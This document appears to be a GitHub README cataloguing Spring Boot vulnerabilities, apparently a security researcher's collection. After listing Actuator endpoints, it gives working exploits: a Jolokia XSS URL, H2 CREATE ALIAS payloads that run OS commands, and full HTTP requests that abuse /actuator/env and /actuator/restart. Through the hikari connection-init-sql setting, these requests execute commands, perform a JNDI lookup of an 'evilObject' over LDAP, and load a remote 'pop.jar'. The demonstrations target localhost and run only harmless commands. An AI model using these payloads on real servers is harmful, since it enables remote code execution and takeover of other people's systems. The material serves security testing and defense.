# Spring Boot Vulnerability (to be continued....)

### 0x01 Spring Boot Actuator Exposed

Actuator endpoints allow you to monitor and interact with your Spring application. Spring Boot includes a number of built-in endpoints and you can also add your own. For example the health endpoint provides basic application health information. The following endpoints are available: 

* /autoconfig - Displays an auto-configuration report showing all auto-configuration candidates and the reason why they 'were' or 'were not' applied.
* /beans - Displays a complete list of all the Spring beans in your application.
* /configprops - Displays a collated list of all @ConfigurationProperties.
* /dump - Performs a thread dump.
* /env - Exposes properties from Spring's ConfigurableEnvironment.
* /health - Shows application health information (a simple 'status' when accessed over an unauthenticated connection or full message details when authenticated).
* /info - Displays arbitrary application info.
* /metrics - Shows 'metrics' information for the current application.
* /mappings - Displays a collated list of all @RequestMapping paths.
* /shutdown - Allows the application to be gracefully shutdown (not enabled by default).
* /trace - Displays trace information (by default the last few HTTP requests).
  
  
### 0x02 Spring Boot RCE/XSS involving Jolokia

#### Jolokia RCE





#### Jolokia XSS (CVE-2018-1000129) fixed since Jolokia ``1.5.0``

pom.xml  

```
        <dependency>
            <groupId>org.jolokia</groupId>
            <artifactId>jolokia-core</artifactId>
            <version>1.4.0</version>
        </dependency>
```

When visiting URL ``http://127.0.0.1:10090/actuator/jolokia/read%3Csvg%20onload=alert('xss')%3E?mimeType=text/html``

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/jolokia.png">


### 0x03 Spring Boot RCE involving H2 Database JNDI Injection

pom.xml

```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-jpa</artifactId>
    <version>2.2.6.RELEASE</version>
</dependency>

<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <scope>runtime</scope>
    <version>1.4.2</version>
</dependency>
```
application.properties

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

You can visit ``/actutor/env`` to make sure ``H2 Console`` is enabled.

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/h2-console.png">



##### Sample1: Execute ``open -a Calculator`` Command

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/h2db-jndi.png">


### 0x04 Spring Boot RCE involving H2 Database ``ALIAS`` Command

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/h2db-alias2.png">

##### Sample1: Execute ``id`` Command
```
CREATE ALIAS EXECMD AS $$ String execmd(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECMD('id')
```

##### Sample2: Execute ``open -a Calculator`` Command

```
CREATE ALIAS EXECMD AS $$ String execmd(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd);return null; }$$;

CALL EXECMD('open -a Calculator');
```

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/h2db-alias.png">



### 0x05 Spring Boot RCE involving JMX enabled

When visiting URL  ``http://127.0.0.1:10090/actuator/env/spring.jmx.enabled``, you will find JMX is enabled. 

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/jmx.png">



##### Sample1: Execute ``open -a Calculator`` Command

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability-DB/blob/master/jmx2.png">



### 0x06 Spring Boot RCE involving H2 Database 

#### 0x001  Remote Code Execution via ``spring.datasource.hikari.connection-test-query`` OR ``spring.datasource.hikari.connection-init-sql``

```
Step 1:
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:10090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Content-Length: 280

{"sourceType": "com.zaxxer.hikari.HikariDataSource","name":"spring.datasource.hikari.connection-init-sql","value":"CREATE ALIAS EXECMD AS $$ String execmd(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd);return null; }$$;CALL EXECMD('open -a Calculator');"}

STEP 2:
POST /actuator/restart HTTP/1.1
```


#### 0x002 JNDI Injection

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability/blob/master/jndi.gif">

```
Step 1:
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:10090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/json
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,fr;q=0.6
Connection: close
Content-Length: 320

{
  "name": "spring.datasource.hikari.connection-init-sql",
  "value": "CREATE ALIAS jndi AS $$ import javax.naming.InitialContext;@CODE String jndi(String url) throws Exception {new InitialContext().lookup(url);return null;}$$;CALL jndi('ldap://127.0.0.1:1389/evilObject');"
}


STEP 2:
POST /actuator/restart HTTP/1.1
```

#### 0x003 URL Classloader

<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability/blob/master/urlclassloader.gif">

```
Step 1:
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:10090
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/json
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,fr;q=0.6
Connection: close
Content-Length: 320

{
  "name": "spring.datasource.hikari.connection-init-sql",
  "value": "CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName (\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$;CALL remoteUrl()"
}

STEP 2:
POST /actuator/restart HTTP/1.1
```


### 0x07 Spring Boot RCE involving MyBatis(CVE-2020-26945)


<img src="https://github.com/pyn3rd/Spring-Boot-Vulnerability/blob/master/mybatis.gif">

